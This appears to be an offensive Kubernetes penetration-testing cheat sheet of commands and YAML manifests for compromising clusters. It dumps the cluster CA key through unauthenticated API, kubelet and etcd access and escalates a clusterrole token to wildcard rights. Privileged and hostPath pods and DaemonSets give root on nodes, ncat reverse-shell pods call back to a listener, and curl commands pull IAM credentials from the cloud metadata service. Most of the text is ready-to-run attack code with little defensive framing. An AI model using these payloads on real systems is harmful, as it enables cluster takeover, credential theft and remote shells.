What can I do currently?
	kubectl can-i --list


Look for Cluster CA key
	/etc/kubernetes/pki/ca.key
	see https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/


Insecure Port
	kubectl -s http://<node_IP>:8080 -n kube-system get pods
	kubectl -s http://<node_IP>:8080 -n kube-system exec -it kube-apiserver-<cluster_name>-control-plane /bin/sh
	cat /etc/kubernetes/pki/ca.key

Secure Port (no authentication)
	kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s https://<target_IP>:<secure_port_eg_6443> get po -n kube-system

	kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s https://<target_IP>:<secure_port_eg_6443> -n kube-system exec kube-apiserver-<cluster_name>-control-plane -- cat /etc/kubernetes/pki/ca.key

Kubelet API (no authentication)
	curl https://172.18.0.4:10250/pods -k | jq | grep apiserver
			
	curl -X POST https://172.18.0.4:10250/run/kube-system/kube-apiserver-<cluster_name>-control-plane/kube-apiserver -k -d "cmd=cat /etc/kubernetes/pki/ca.key"

etcd (no authentication)
	kubectl --insecure-skip-tls-verify -s https://<target_IP>:6443 --token="<JWT_token>" -n kube-system get pods
	kubectl --insecure-skip-tls-verify -s https://<target_IP>:6443 --token="<JWT_token>" -n kube-system exec -it kube-apiserver-<cluster_name>-control-plane /bin/sh

	cat /etc/kubernetes/pki/ca.key

Kubernetes Dashboard (no authentication)
	kubectl --token="<JWT_token>" -s https://<target_IP>:6443 --insecure-skip-tls-verify -n kube-system exec kube-apiserver-<cluster_name>-control-plane cat /etc/kubernetes/pki/ca.key

Access to cluserrole-aggregation-controller secret
		kubectl -n kube-system get secret clusterrole-aggregation-controller-token-... -o json

		get "token" field from secret and b64 decode it to get JWT token

		assign JWT to variable for ease of use
			TOKEN='<decoded_JWT_token'

		kubectl --token=$TOKEN get clusterroles

		kubectl --token=$TOKEN edit clusterrole system:controller:clusterrole-aggregation-controller

		Add wildcards to the following in the "rules" section

			- apiGroups:
		  - '*'
		  resources:
		  - '*'
		  verbs:
		  - '*'

		kubectl --token=$TOKEN get pods

		kubectl --token=$TOKEN -n kube-system exec kube-apiserver-sshgs-control-plane cat /etc/kubernetes/pki/ca.key



Get secrets from etcd 
	includes config for whole cluster, including all secrets

	run exploit pod on a control-plane node
		include the nodeName selector in the pod spec
			
			spec:
		    nodeName: foo-node # schedule pod to specific node


Find secrets with access to etcd database (or backup)
		strings db | grep -B 4 Opaque
		strings db | grep -B 1 -A 1 "service-account-token"




Cloud Metadata Services
	AWS/Azure 
		curl http://169.254.169.254/
	GCP 
		curl https://metadata.google.internal
	
	possible breakout
		access to IAM tokens
			not easy to block access from EC2 or K8s
				K8s may be provided with excessive permissions to manage EC2 for autoscaling
			curl http://169.254.169.254/latest/meta-data/iam/security-credentials
			curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
		access to K8s tokens

Allowing pod creation leads to privesc through various routes
	can create privileged Docker containers and breakout to node
	risks even with PSP enabled

Check for impersonation rights 

Check .bash_history


Compromised User Attacks

	CA key if you have a pod with pod exec rights - single node
		kubectl -n kube-system get pods
		kubectl -n kube-system exec kube-apiserver-<cluster_name>-control-plane cat /etc/kubernetes/pki/ca.key

	
	CA key if you have pod creation rights and pod exec rights - single node
		Works on Master Nodes - mounts PKI directory in container to dump cluster CA key

		vi key-dumper-pod.yml

apiVersion: v1
kind: Pod
metadata: 
  name: keydumper-pod
  labels:
    app: keydumper
spec:
  containers:
  - name: keydumper-pod
    image: busybox
    volumeMounts:
    - mountPath: /pki
      name: keyvolume
    command: [ "cat", "/pki/ca.key" ]
  volumes:
  - name: keyvolume
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory

		kubectl create -f ./key-dumper-pod.yml
		kubectl logs -f keydumper-pod

	CA key if you have pod creation rights and pod exec rights - multiple nodes

		Get the control-plane node name
			kubectl get nodes

		vi keydumper-multi.yml

apiVersion: v1
kind: Pod
metadata: 
  name: keydumper-pod
  labels:
    app: keydumper
spec:
  containers:
  - name: keydumper-pod
    image: busybox
    volumeMounts:
    - mountPath: /pki
      name: keyvolume
    command: [ "cat", "/pki/ca.key" ]
  volumes:
  - name: keyvolume
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory
  tolerations:
  - key: node-role.kubernetes.io/master
    effect: NoSchedule
  nodeName: <cluster_name>-control-plane  

		kubectl create -f ./keydumper-multi.yml
		kubectl logs keydumper-pod


	Root on node if you have pod creation rights and pod exec rights #1
		kubectl run r00t --restart=Never -ti --rm --image h0nk --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1", "image":"alpine", "command":["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"], "stdin": true, "tty":true, "imagePullPolicy":"IfNotPresent", "securityContext":{"privileged":true}}]}}'

		ctrl-C

		kubectl exec -it r00t bash

		cat /etc/kubernetes/pki/ca.key

		**Escalate to root on host**
			kubectl exec -it r00t -- nsenter -a -t 1 bash


	Root on node if you have pod creation rights and pod exec rights #2
	
		vi noderoot.yml 

apiVersion: v1
kind: Pod
metadata: 
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /

		kubectl create -f ./noderoot.yml
		kubectl exec -it noderootpod chroot /host

		cat /etc/kubernetes/pki/ca.key


	Root on node via reverse shell if you have pod creation rights but not exec rights
		ifconfig

		nc -nvlp <listener_port>

		vi ncat-reverse-shell-pod.yml 

apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /rooted
      name: hostvolume
    args: ['<listener_IP>', '<listener_port>', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory

		kubectl create -f ncat-reverse-shell-pod.yml
		
		cat /rooted/etc/kubernetes/pki/ca.key


	Root on node if you have pod exec rights for pod running as root and /var/log is mounted on pod

		vi escaper.yml

apiVersion: v1
kind: Pod
metadata: 
  name: escaper
spec:
  containers:
  - name: escaper
    image: danielsagi/kube-pod-escape
    volumeMounts:
    - name: logs
      mountPath: /var/log/host
  volumes:
  - name: logs
    hostPath:
      path: /var/log
      type: Directory

      kubectl create -f escaper.yml
      kubectl exec -it escaper bash

      uses two custom commands running from within the pod
				lsh ==  ls (on the host fs) 
				cath == cat (on the host fs)

	
	Root on all nodes (incl master nodes) if you have create daemonset rights and pod exec rights

		vi nodedeamon.yml

apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootpod
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      volumes:
      - name: noderoot
        hostPath:
          path: /

		kubectl create -f ./nodedaemon.yml
		kubectl exec -it noderootpod chroot /host


	Root on node via reverse shell if you have daemonset creation rights but not pod exec rights
		ifconfig

		nc -nvlp <listener_port>

		vi nodedaemon-rev.yml

apiVersion: /api/apps/v1
kind: DaemonSet
metadata:
  name: noderootpod-rev
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon-rev
  template:
    metadata:
      labels:
        name: noderootdaemon-rev
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: ncat-reverse-shell
        image: raesene/ncat
        volumeMounts:
        - mountPath: /rooted
          name: hostvolume
        args: ['<listener_IP>', '<listener_port>', '-e', '/bin/bash']
      volumes:
      - name: hostvolume
        hostPath:
          path: /
          type: Directory

		kubectl create -f nodedaemon-rev.yml

		cat /rooted/etc/kubernetes/pki/ca.key


If you have pod creation rights, but no Internet access to pull a new image
	Find a pod on the cluster with appropriate tooling (sh, ls, etc.)
	Create a new manifest with "imagePullPolicy: None" and "hostPath: path: /" using that pod's image
		doesn't try to reach out to the hub, just uses local Docker's version of the image
		see noderoot.yml above
	Create the pod and exec into it


If you are in a pod running with `hostPID: true`
	can see all processes running on host (ps)
	can kill any process on the node (DoS)


If you are in a pod running with `hostNetwork: true`
	can use tcpdump to sniff unencrypted traffic on the host
	can access services bound to localhost's loopback interface
	can access services otherwise blocked by network policies


ready-to-use manifests for different permissions/resources/directions
	https://github.com/BishopFox/badPods


Misc Container Breakouts
	https://tbhaxor.com/container-breakout-part-1/
	https://tbhaxor.com/container-breakout-part-2/



port-forwarding
	get direct access to a pod's services from a local machine
		portforward cluster services to the machine you run kubectl on
		kubectl port-forward pod/<pod_name> --address <destination_IP> <destination_port>:<pod_service_port>
	good for getting screenshots

file copying
	copy files out of a container
		kubectl cp default/<pod_name>:/path/to/file/in/container /path/to/copy/destination
	good for collecting evidence for reporting

Run any Helm Chart using Tiller and gain node root access
	helm --host tiller-deploy.kube-system.svc.cluster.local:44134 install /path/to/chart

	Demonstrating Tiller is running unauthenticated
		helm --host tiller-deploy.kube-system.svc.cluster.local:44134 version
		helm --host tiller-deploy.kube-system.svc.cluster.local:44134 ls

AWS K8s

	Check for permission & priv esc
	
		./octopus-gather.sh
			#This creates the folder "out" and all files will be created in here - octopus.py uses the files located here

		aws eks describe-cluster --output json --name <cluster_name> > ./out/eks-cluster-config.json

		python3 octopus.py --input out --output out --cloud-config-file ./out/eks-cluster-config.json > ./out/octopus_overview

		mv ./out <destination_path>

		mv <destination_path>/out/octopus_overview <destination_path>

		cd <destination_path>/out

		cat <octopus-output-date.json> | jq > ../octopus_output

	Steal AWS tokens

		create a pod in their network:
			kubectl run -it --image=smarticu5/container-review-admin ncc-test -- /bin/bash 

		check for AWS permissions:
			aws sts get-caller-identity

		retrieve tokens:
			TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X
			-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
